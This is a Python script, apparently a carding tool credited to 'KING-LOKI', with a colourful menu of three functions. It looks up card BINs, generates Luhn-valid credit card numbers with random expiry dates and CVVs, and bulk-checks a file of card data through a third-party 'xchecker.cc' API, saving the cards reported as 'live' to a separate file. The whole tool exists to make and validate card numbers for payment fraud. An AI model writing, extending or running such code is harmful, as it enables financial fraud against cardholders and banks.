#!/usr/bin/env python3
import requests
import random
import os
import time
from datetime import datetime
from tqdm import tqdm
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

def installation_loader():
    print(Fore.BLUE + Style.BRIGHT + "Initializing Tool...")
    for i in tqdm(range(100), desc="Initializing", ncols=75, colour="green"):
        time.sleep(0.02)
    print(Fore.BLUE + Style.BRIGHT + "Initializing complete. Starting tool...\n")
    time.sleep(0.5)

# Function to fetch BIN details
def fetch_bin_data(bin_code):
    url = f"https://binlist.io/lookup/{bin_code}/"
    headers = {"Accept": "application/json, text/plain, */*"}
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        return response.json()
    else:
        return None

def binlookup():
    bin_code = input(Fore.CYAN + "Enter a 6-digit BIN code: ").strip()
    if len(bin_code) == 6 and bin_code.isdigit():
        data = fetch_bin_data(bin_code)
        if data:
            result = (
                f"\n{Fore.GREEN + Style.BRIGHT}BIN Info:\n"
                f"{Fore.YELLOW}Scheme: {data.get('scheme', 'N/A')}\n"
                f"{Fore.YELLOW}Type: {data.get('type', 'N/A')}\n"
                f"{Fore.YELLOW}Country: {data['country'].get('name', 'N/A')}\n"
                f"{Fore.YELLOW}Bank: {data['bank'].get('name', 'N/A')}\n"
            )
            print(result)
            print("")
            input("Press enter....")
        else:
            print(Fore.RED + "Failed to fetch BIN data.\n")
    else:
        print(Fore.RED + "Invalid BIN code. Please enter a valid 6-digit BIN.\n")

# Function to generate a credit card number that passes the Luhn check
def generate_credit_card(prefix, length=17):
    while True:
        number = prefix + "".join([str(random.randint(0, 9)) for _ in range(length - len(prefix) - 1)])
        if validate_credit_card(number):
            return number

def validate_credit_card(card_number):
    digits = [int(d) for d in str(card_number)]
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum([int(x) for x in str(d * 2)])
    return checksum % 10 == 0

def ccgen():
    card_type = input(Fore.CYAN + "Enter card type (Visa, MasterCard, or Amex): ").strip().lower()
    try:
        count = int(input(Fore.CYAN + "How many cards to generate? ").strip())
    except ValueError:
        print(Fore.RED + "Invalid count. Please enter an integer.\n")
        return

    prefixes = {"visa": "4", "mastercard": "5", "amex": "3"}
    if card_type not in prefixes:
        print(Fore.RED + "Invalid card type. Choose Visa, MasterCard, or Amex.\n")
        return

    prefix = prefixes[card_type]
    print(Fore.GREEN + "\nGenerated Cards:")
    for _ in range(count):
        card_number = generate_credit_card(prefix)
        exp_month = random.randint(1, 12)
        exp_year = random.randint(23, 30)
        cvv = random.randint(100, 999)
        print(Fore.YELLOW + f"{card_number}|{exp_month:02}|{exp_year}|{cvv}")
    print("")
    input("Press enter....")

def check_cards_via_api(cc_number, exp_month, exp_year, cvc):
    url = f"https://www.xchecker.cc/api.php?cc={cc_number}|{exp_month}|{exp_year}|{cvc}"
    response = requests.get(url)
    if response.status_code == 200:
        try:
            data = response.json()
            status = data.get("status", "Unknown")
            details = data.get("details", "No details provided")
            return f"{cc_number}|{exp_month}|{exp_year}|{cvc}|{status}|{details}"
        except Exception as e:
            return f"{cc_number}|Error|Response parsing failed: {e}"
    else:
        return f"{cc_number}|Error|Failed to check: HTTP {response.status_code}"

def checker():
    file_path = input(Fore.CYAN + "Enter the path to the text file containing card data: ").strip()
    if not os.path.exists(file_path):
        print(Fore.RED + "Input file not found.\n")
        return

    os.makedirs("downloads", exist_ok=True)
    output = []
    live_cards = []
    
    # Read all non-empty lines from the file
    with open(file_path, 'r') as f:
        lines = [line.strip() for line in f if line.strip()]

    print(Fore.BLUE + "\nChecking cards:")
    for line in tqdm(lines, desc="Checking cards", ncols=75, colour="yellow"):
        card_data = line.split('|')
        if len(card_data) == 4:
            cc_number, exp_month, exp_year, cvc = card_data
            result = check_cards_via_api(cc_number, exp_month, exp_year, cvc)
            output.append(result)
            parts = result.split('|')
            # Assuming that a "Live" status is returned in the 5th field (index 4)
            if len(parts) >= 5 and parts[4].strip().lower() == "live":
                live_cards.append(result)
        else:
            result = f"{line}|Error|Invalid format"
            output.append(result)
        # Simulate a slight delay for each card check
        time.sleep(0.1)
    
    timestamp = int(datetime.now().timestamp())
    result_file = f"checked_{timestamp}.txt"
    result_path = os.path.join("downloads", result_file)
    with open(result_path, 'w') as f:
        f.write("\n".join(output))
    print(Fore.GREEN + f"\nAll results saved to {result_path}\n")
    
    if live_cards:
        print(Fore.GREEN + Style.BRIGHT + "Live Cards:")
        for card in live_cards:
            print(Fore.YELLOW + card)
        live_file = f"live_cards_{timestamp}.txt"
        live_file_path = os.path.join("downloads", live_file)
        with open(live_file_path, 'w') as f:
            f.write("\n".join(live_cards))
        print(Fore.GREEN + f"\nLive cards saved to {live_file_path}\n")
    else:
        print(Fore.RED + "No live cards found.\n")

def main_menu():
    while True:
        os.system("clear")
        print("")
        print(Fore.GREEN + ''' ██████╗ ██████╗██╗  ██╗
██╔════╝██╔════╝╚██╗██╔╝
██║     ██║      ╚███╔╝ 
██║     ██║      ██╔██╗ 
╚██████╗╚██████╗██╔╝ ██╗
 ╚═════╝ ╚═════╝╚═╝  ╚═╝''')
        print("Tool Developed By KING-LOKI")
        print("")
        print(Fore.MAGENTA + Style.BRIGHT + "Credit Card Tool Menu:")
        print(Fore.CYAN + "1. BIN Lookup")
        print(Fore.CYAN + "2. Generate Credit Cards")
        print(Fore.CYAN + "3. Check Credit Cards via API (and extract live cards)")
        print(Fore.CYAN + "4. Exit")
        choice = input(Fore.CYAN + "Select an option (1-4): ").strip()

        if choice == "1":
            binlookup()
        elif choice == "2":
            ccgen()
        elif choice == "3":
            checker()
        elif choice == "4":
            print(Fore.BLUE + "Exiting the tool.")
            break
        else:
            print(Fore.RED + "Invalid option. Please choose between 1 and 4.\n")

if __name__ == "__main__":
    installation_loader()
    main_menu()
